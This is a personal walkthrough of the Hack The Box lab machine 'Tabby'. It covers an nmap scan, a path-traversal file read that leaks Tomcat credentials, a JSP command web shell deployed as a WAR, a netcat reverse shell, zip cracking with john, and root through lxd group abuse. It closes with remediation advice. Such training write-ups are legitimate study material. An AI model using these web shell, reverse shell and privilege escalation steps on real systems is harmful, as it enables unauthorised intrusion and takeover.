+++
date = '2026-06-13T00:27:08-04:00'
title = 'Tabby'
tags = ["htb","easy","password guessing","LFI","lxd","john"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9b4c7b192eb00be8460364338e48f21f.png)

https://www.hackthebox.com/machines/Tabby
## OS: Linux
``` IP
10.129.16.54
```
## Credentials:

| Username | Password             | Notes/Hash                                  |
| -------- | -------------------- | ------------------------------------------- |
| `tomcat` | `$3cureP4s5w0rd123!` | Leaked password from `LFI` vulnerability    |
| `ash`    | `admin@it`           | Cracked password from the backup `zip` file |

---
## `nmap` results:
```
# Nmap 7.99 scan initiated Fri Jun 12 19:45:45 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Tabby 10.129.16.54
Nmap scan report for 10.129.16.54
Host is up, received reset ttl 63 (0.019s latency).
Scanned at 2026-06-12 19:45:46 EDT for 20s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDv5dlPNfENa5t2oe/3IuN3fRk9WZkyP83WGvRByWfBtj3aJH1wjpPJMUTuELccEyNDXaUnsbrhgH76eGVQAyF56DnY3QxWlt82MgHTJWDwdt4hKMDLNKlt+i+sElqhYwXPYYWfuApFKiAUr+KGvnk9xJrhZ9/bAp+rW84LyeJOSZ8iqPVAdcjve5As1O+qcSAUfIHlZGRzkVuUuOq2wxUvegKsYnmKWUZW1E/fRq3tJbqJ5Z0JwDklN21HR4dmM7/VTHQ/AaTl/JnQxOLFUlryXAFbjgLa1SDOTBDOG72j2/II2hdeMOKN8YZN9DHgt6qKiyn0wJvSE2nddC2BbnGzamJlnQaXOpSb3+WDHP+JMxQJQrRxFoG4R6X2c0rx+yM5XnYHur9cQXC9fp+lkxQ8TtkMijbPlS2umFYcd9WrMdtEbSeKbaozi9YwbR9MQh8zU2cBc7T9p3395HAWt/wCcK9a61XrQY/XDr5OSF2MI5ESVG9e0t8jG9Q0opFo19U=
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDeYRLCeSORNbRhDh42glSCZCYQXeOAM2EKxfk5bjXecQyV5W7DYsEqMkFgd76xwdGtQtNVcfTyXeLxyk+lp9HE=
|   256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKHA/3Dphu1SUgMA6qPzqzm6lH2Cuh0exaIRQqi4ST8y
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat
|_http-title: Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
```
 
---
## Attack + Enum Vectors
- TCP 8080: HTTP Apache Tomcat
- TCP 80: HTTP Apache httpd 2.4.41 
- TCP 22: SSH OpenSSH 8.2p1
### UDP (161 SNMP)?
- closed


---
## Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
On HTTP 80:
```
We have recently upgraded several services. Our servers are now more secure than ever. [Read our statement on recovering from the data breach](http://megahosting.htb/news.php?file=statement)
```
```
http://megahosting.htb/news.php?file=statement
```
lets add that to our `/etc/hosts`:
```
echo "10.129.16.54 megahosting.htb" >> /etc/hosts
```
now visit:
```
http://megahosting.htb/news.php?file=statement
```
and since it has `file=` maybe there is LFI, try:
```
http://megahosting.htb/news.php?file=../../../../../../../etc/passwd
```
we confirm it has LFI!
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash
```
So we know there is a `/home/ash`? with user name `Server,,,`?

```
http://megahosting.htb/news.php?file=../../../../../../../proc/self/cmdline
```
reveals:
```
/usr/sbin/apache2-kstart
```

```
http://megahosting.htb/news.php?file=../../../../../../../etc/apache2/apache2.conf
```
reveals:
```
# This is the main Apache server configuration file. It contains the # configuration directives that give the server its instructions. # See http://httpd.apache.org/docs/2.4/ for detailed information about # the directives and /usr/share/doc/apache2/README.Debian about Debian specific # hints. # # # Summary of how the Apache 2 configuration works in Debian: # The Apache 2 web server configuration in Debian is quite different to # upstream's suggested way to configure the web server. This is because Debian's # default Apache2 installation attempts to make adding and removing modules, # virtual hosts, and extra configuration directives as flexible as possible, in # order to make automating the changes and administering the server as easy as # possible. # It is split into several files forming the configuration hierarchy outlined # below, all located in the /etc/apache2/ directory: # # /etc/apache2/ # |-- apache2.conf # | `-- ports.conf # |-- mods-enabled # | |-- *.load # | `-- *.conf # |-- conf-enabled # | `-- *.conf # `-- sites-enabled # `-- *.conf # # # * apache2.conf is the main configuration file (this file). It puts the pieces # together by including all remaining configuration files when starting up the # web server. # # * ports.conf is always included from the main configuration file. It is # supposed to determine listening ports for incoming connections which can be # customized anytime. # # * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/ # directories contain particular configuration snippets which manage modules, # global configuration fragments, or virtual host configurations, # respectively. # # They are activated by symlinking available configuration files from their # respective *-available/ counterparts. These should be managed by using our # helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See # their respective man pages for detailed information. # # * The binary is called apache2. Due to the use of environment variables, in # the default configuration, apache2 needs to be started/stopped with # /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not # work with the default configuration. # Global configuration # # # ServerRoot: The top of the directory tree under which the server's # configuration, error, and log files are kept. # # NOTE! If you intend to place this on an NFS (or otherwise network) # mounted filesystem then please read the Mutex documentation (available # at ); # you will save yourself a lot of trouble. # # Do NOT add a slash at the end of the directory path. # #ServerRoot "/etc/apache2" # # The accept serialization lock file MUST BE STORED ON A LOCAL DISK. # #Mutex file:${APACHE_LOCK_DIR} default # # The directory where shm and other runtime files will be stored. # DefaultRuntimeDir ${APACHE_RUN_DIR} # # PidFile: The file in which the server should record its process # identification number when it starts. # This needs to be set in /etc/apache2/envvars # PidFile ${APACHE_PID_FILE} # # Timeout: The number of seconds before receives and sends time out. # Timeout 300 # # KeepAlive: Whether or not to allow persistent connections (more than # one request per connection). Set to "Off" to deactivate. # KeepAlive On # # MaxKeepAliveRequests: The maximum number of requests to allow # during a persistent connection. Set to 0 to allow an unlimited amount. # We recommend you leave this number high, for maximum performance. # MaxKeepAliveRequests 100 # # KeepAliveTimeout: Number of seconds to wait for the next request from the # same client on the same connection. # KeepAliveTimeout 5 # These need to be set in /etc/apache2/envvars User ${APACHE_RUN_USER} Group ${APACHE_RUN_GROUP} # # HostnameLookups: Log the names of clients or just their IP addresses # e.g., www.apache.org (on) or 204.62.129.132 (off). # The default is off because it'd be overall better for the net if people # had to knowingly turn this feature on, since enabling it means that # each client request will result in AT LEAST one lookup request to the # nameserver. # HostnameLookups Off # ErrorLog: The location of the error log file. # If you do not specify an ErrorLog directive within a # container, error messages relating to that virtual host will be # logged here. If you *do* define an error logfile for a # container, that host's errors will be logged there and not here. # ErrorLog ${APACHE_LOG_DIR}/error.log # # LogLevel: Control the severity of messages logged to the error_log. # Available values: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the log level for particular modules, e.g. # "LogLevel info ssl:warn" # LogLevel warn # Include module configuration: IncludeOptional mods-enabled/*.load IncludeOptional mods-enabled/*.conf # Include list of ports to listen on Include ports.conf # Sets the default security model of the Apache2 HTTPD server. It does # not allow access to the root filesystem outside of /usr/share and /var/www. # The former is used by web applications packaged in Debian, # the latter may be used for local directories served by the web server. If # your system is serving content from a sub-directory in /srv you must allow # access here, or in any related virtual host. Options FollowSymLinks AllowOverride None Require all denied AllowOverride None Require all granted Options FollowSymLinks AllowOverride None Require all granted # # Options Indexes FollowSymLinks # AllowOverride None # Require all granted # # AccessFileName: The name of the file to look for in each directory # for additional configuration directives. See also the AllowOverride # directive. # AccessFileName .htaccess # # The following lines prevent .htaccess and .htpasswd files from being # viewed by Web clients. # Require all denied # # The following directives define some format nicknames for use with # a CustomLog directive. # # These deviate from the Common Log Format definitions in that they use %O # (the actual bytes sent including headers) instead of %b (the size of the # requested file), because the latter makes it impossible to detect partial # requests. # # Note that the use of %{X-Forwarded-For}i instead of %h is not recommended. # Use mod_remoteip instead. # LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined LogFormat "%h %l %u %t \"%r\" %>s %O" common LogFormat "%{Referer}i -> %U" referer LogFormat "%{User-agent}i" agent # Include of directories ignores editors' and dpkg's backup files, # see README.Debian for details. # Include generic snippets of statements IncludeOptional conf-enabled/*.conf # Include the virtual host configurations: IncludeOptional sites-enabled/*.conf # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

```
http://megahosting.htb/news.php?file=../../../../../../../etc/apache2/sites-enabled/000-default.conf
```
shows:
```
# The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request's Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly. #ServerName www.example.com ServerAdmin webmaster@localhost DocumentRoot /var/www/html # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with "a2disconf". #Include conf-available/serve-cgi-bin.conf # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

```
http://megahosting.htb:8080/
```
shows:
```
/etc/tomcat9/tomcat-users.xml
```
but if we utilize the LFI:
```
http://megahosting.htb/news.php?file=../../../../../../../etc/tomcat9/tomcat-users.xml
```
does not return anything.

I am assuming the file is moved somewhere else or installed somewhere else?
```
tomcat tomcat-users.xml installed locations
```
on google with AI overview shows:
```
Package Manager installations (`apt`, `yum`): `/etc/tomcat<version>/tomcat-users.xml`

Alternative: `/usr/share/tomcat<version>/conf/tomcat-users.xml`
```

Viewing:
```
http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/conf/tomcat-users.xml
```
still does not return anything.

[0xdf](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html#get-tomcat-creds) pointed out that we should use `view-source:` to see potentially commented files, noted I will add that to my methodology now:
```
view-source:http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/conf/tomcat-users.xml
```
and we obtained:
```
<?xml version="1.0" encoding="UTF-8"?> <!-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. --> <tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd" version="1.0"> <!-- NOTE: By default, no user is included in the "manager-gui" role required to operate the "/manager/html" web application. If you wish to use this app, you must define such a user - the username and password are arbitrary. It is strongly recommended that you do NOT use one of the users in the commented out section below since they are intended for use with the examples web application. --> <!-- NOTE: The sample user and role entries below are intended for use with the examples web application. They are wrapped in a comment and thus are ignored when reading this file. If you wish to configure these users for use with the examples web application, do not forget to remove the <!.. ..> that surrounds them. You will also need to set the passwords to something appropriate. --> <!-- <role rolename="tomcat"/> <role rolename="role1"/> <user username="tomcat" password="<must-be-changed>" roles="tomcat"/> <user username="both" password="<must-be-changed>" roles="tomcat,role1"/> <user username="role1" password="<must-be-changed>" roles="role1"/> --> <role rolename="admin-gui"/> <role rolename="manager-script"/> <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/> </tomcat-users>
```
`tomcat:$3cureP4s5w0rd123!` as password!

---
## Initial Foothold
Now [hackviser](https://hackviser.com/tactics/pentesting/services/tomcat#war-file-upload-manager-access) has a way to obain code execution with authenticated `tomcat`:
```
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
EOF
```
```
mkdir -p WEB-INF
```
```
jar -cvf shell.war shell.jsp WEB-INF
```
then upload it:
```
curl -u 'tomcat:$3cureP4s5w0rd123!' \
  --upload-file shell.war \
  "http://megahosting.htb:8080/manager/text/deploy?path=/shell&update=true"
```
and we can access on
```
curl "http://megahosting.htb:8080/shell/shell.jsp?cmd=whoami"
```

Perfect, now let's set up a listener to get reverse shell:
```
sudo nc -lvnp 1337
```
then trigger reverse shell:
```
curl "http://megahosting.htb:8080/shell/shell.jsp?cmd=busybox+nc+HTB_VPN_IP+1337+-e+bash"
```
we got a shellback! Now to upgrade it:
```
export TERM=xterm
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
then `Ctrl + Z` to background the shell:
```
stty raw -echo;fg
```
```
reset
```
enter my terminal size:
```
stty rows 48 cols 210
```
and here we got a fully functioning shell!

---
## Priv Esc
```
ls /var/www/html
```
shows:
```
assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt
```
let's view files:
```
ls -lah /var/www/html/files
```
```
total 36K
drwxr-xr-x 4 ash  ash  4.0K Aug 19  2021 .
drwxr-xr-x 4 root root 4.0K Aug 19  2021 ..
-rw-r--r-- 1 ash  ash  8.6K Jun 16  2020 16162020_backup.zip
drwxr-xr-x 2 root root 4.0K Aug 19  2021 archive
drwxr-xr-x 2 root root 4.0K Aug 19  2021 revoked_certs
-rw-r--r-- 1 root root 6.4K Jun 16  2020 statement
```
the backup file seems pretty interesting, trying to unzip needs a password:
```
sudo nc -lvnp 1337 > ash_backup.zip
```
and transfer the `zip` to our kali:
```
nc 10.10.15.101 1337 < /var/www/html/files/16162020_backup.zip
```

Then let's try to get the password of the `zip`:
```
zip2john ash_backup.zip > zip.hash
```
And try crack it with `john`:
```
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```
We got:
```
admin@it         (ash_backup.zip)
```
now we can unzip it, but it's essential just the backup, well let's spray the password to `ash` since he was the owner of the backup `zip` file:
```
su - ash
```
enter password: we successfully pivoted to `ash`!

```
id
```
shows:
```
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
so we can abuse the `lxd` group privilege escalation:

Take reference from: https://hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html

Install requriements
```
sudo apt update
```
```
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage
```
Clone repo
```
mkdir -p $HOME/go/src/github.com/lxc/
```
```
cd $HOME/go/src/github.com/lxc/
```
```
git clone https://github.com/lxc/distrobuilder
```
Make distrobuilder
```
cd ./distrobuilder
```
```
make
```
Prepare the creation of alpine
```
mkdir -p $HOME/ContainerImages/alpine/
```
```
cd $HOME/ContainerImages/alpine/
```
```
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```
Create the container: change the architecture accordingly while compiling locally
```
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Then upload the incus.tar.xz (lxd.tar.xz) and rootfs.squashfs, or:
```
wget http://HTB_VPN_IP/incus.tar.xz -O lxd.tar.xz
```
```
wget http://kali/rootfs.squashfs
```

Now on target:
```
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
```
Check if image is there
```
lxc image list
```
start the `lxd`: set up all options on default
```
lxd init
```
run the image
```
lxc init alpine privesc -c security.privileged=true
```
List containers
```
lxc list
```
```
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

then we can execute the container and get root:
```
lxc start privesc
```
```
lxc exec privesc /bin/bash
```
didn't work? Let's try:
```
lxc exec privesc /bin/sh
```
some how this worked:

**then `/mnt/root` is the actual `/` directory:** we can add SUID bit by:
```
chmod +s /mnt/root/bin/bash
```
now if we exit out of the container: we can do:
```
/bin/bash -p
```
and get root shell!

Therefore, pwn'd.

---
## Conclusion & Remediation
Tabby is not really a complicated box, but requires some enumeration and sharp googling skills with some logical reasoning to think of a path in. The privilege escalation process is not very difficult, in fact I think is very similar to `OSCP` exam styles so I think this box makes a great practice for the `OSCP` exam. The privilege escalation to `root` is a classic `lxd` group privilege escalation that takes some time, but nothing too difficult.

To remediate for similar attacks from this lab: system administrators and web developers needs to make sure to prevent local file inclusion attacks, also not to re-use passwords for `zip` files and their usernames. In addition, `lxd` group should not be assigned to unprivileged users to follow the principle of least privileges.